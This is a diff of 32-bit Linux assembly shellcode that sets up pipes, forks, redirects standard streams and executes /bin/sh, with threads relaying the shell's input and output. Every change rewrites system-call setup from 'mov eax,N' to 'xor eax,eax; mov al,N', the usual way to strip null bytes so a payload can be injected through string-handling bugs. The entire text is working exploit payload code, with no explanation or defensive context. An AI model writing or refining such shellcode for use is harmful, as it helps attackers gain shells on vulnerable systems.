@@ -12,7 +12,8 @@ shcode_start:
 	add	ebp, data_start
 
 	; pipe(m2sh)
-	mov	eax,42
+	xor	eax,eax
+	mov	al,42
 	mov	ebx,ebp
 	add	ebx,m2sh_0
 	int	0x80
@@ -21,7 +22,8 @@ shcode_start:
 	jne	child_dead_interleaved
 
 	; pipe(sh2m)
-	mov	eax,42
+	xor	eax,eax
+	mov	al,42
 	mov	ebx,ebp
 	add	ebx,sh2m_0
 	int	0x80
@@ -30,7 +32,8 @@ shcode_start:
 	jne	child_dead_interleaved
 
 	; fork()
-	mov	eax,2
+	xor	eax,eax
+	mov	al,2
 	int	0x80
 
 	cmp	eax,0
@@ -41,7 +44,8 @@ child_dead_interleaved:
 
 child:
 	; dup2(m2sh[0], 0)   (dup to stdin)
-	mov	eax,63
+	xor	eax,eax
+	mov	al,63
 	mov	ebx,[ebp+m2sh_0]
 	xor	ecx,ecx
 	int	0x80
@@ -50,7 +54,8 @@ child:
 	jne	leave_sh_interleaved
 
 	; dup2(sh2m[1], 1)   (dup to stdout)
-	mov	eax,63
+	xor	eax,eax
+	mov	al,63
 	mov	ebx,[ebp+sh2m_1]
 	inc	ecx
 	int	0x80
@@ -59,7 +64,8 @@ child:
 	jne	leave_sh_interleaved
 	
 	; dup2(sh2m[1], 2)   (dup to stderr)
-	mov	eax,63
+	xor	eax,eax
+	mov	al,63
 	mov	ebx,[ebp+sh2m_1]
 	inc	ecx
 	int	0x80
@@ -68,7 +74,8 @@ child:
 	jne	leave_sh_interleaved
 
 	; execve("/bin/sh", ["/bin/sh"], NULL)
-	mov	eax,11
+	xor	eax,eax
+	mov	al,11
 	mov	ebx,ebp
 	add	ebx,execve_command
 	mov	ecx,ebp
@@ -87,20 +94,23 @@ parent:
 	mov	[ebp+child_pid],eax
 
 	; close(m2sh[0])
-	mov	eax,6
+	xor	eax,eax
+	mov	al,6
 	mov	ebx,ebp
 	add	ebx,m2sh_0
 	int	0x80
 
 	; close(sh2m[1])
-	mov	eax,6
+	xor	eax,eax
+	mov	al,6
 	mov	ebx,ebp
 	add	ebx,sh2m_1
 	int	0x80
 
 	; clone:
 	; one thread for reader, one thread for writer
-	mov	eax,120
+	xor	eax,eax
+	mov	al,120
 	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
 	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
 	mov	ebx,0x00010f00
@@ -159,7 +169,8 @@ reader_while_fds_ok:
 reader_no_overlap:
 	; write the data from the ringbuffer to the child
 	mov	edx,eax
-	mov	eax,4
+	xor	eax,eax
+	mov	al,4
 	add	ebx,esi		; EBX points to position in buffer where the to-be-written data resides
 	mov	ecx,[ebp+m2sh_1]
 	int	0x80
@@ -174,7 +185,8 @@ leave_sh_second_interleaved:
 reader_sleep:
 	; sleep 0.001 seconds:
 	; usleep(0,1000000);
-	mov	eax, 162
+	xor	eax,eax
+	mov	al, 162
 	mov	ebx, ebp
 	add	ebx, foo
 	mov	ecx, ebx
@@ -188,9 +200,11 @@ reader_sleep:
 
 do_terminate_child:
 	; send a SIGKILL to child
-	mov	eax,37
+	xor	eax,eax
+	mov	al,37
 	mov	ebx,[ebp+child_pid]
-	mov	ecx,9	; SIGKILL
+	xor	ecx,ecx
+	mov	cl,9	; SIGKILL
 	int	0x80
 
 	; clear to_child_ok
@@ -221,7 +235,8 @@ writer_while_fds_ok:
 	jz	writer_sleep
 
 	; read ONE SINGLE BYTE and pass it into the buffer.
-	mov	eax,3
+	xor	eax,eax
+	mov	al,3
 	mov	ebx,[ebp+sh2m_0]
 	xor	ecx,ecx
 	mov	cl,[ebp+rto_writer_pos]
@@ -239,7 +254,8 @@ writer_while_fds_ok:
 writer_sleep:
 	; sleep 0.001 seconds:
 	; usleep(0,1000000);
-	mov	eax, 162
+	xor	eax,eax
+	mov	al, 162
 	mov	ebx, ebp
 	add	ebx, foo
 	mov	ecx, ebx
@@ -265,7 +281,8 @@ child_dead:
 	inc byte [ebp]
 
 	; usleep(1,0):
-	mov	eax, 162
+	xor	eax,eax
+	mov	al, 162
 	mov	ebx, ebp
 	add	ebx, foo
 	mov	ecx, ebx
@@ -279,8 +296,8 @@ child_dead:
 
 leave_sh:
 	; exit-point for BOTH parent:writer&reader and child in case of fail
-	xor	ebx,ebx
-	mov	eax,ebx
+	xor	eax,eax
+	mov	ebx,eax
 	inc	eax
 	int	0x80
 
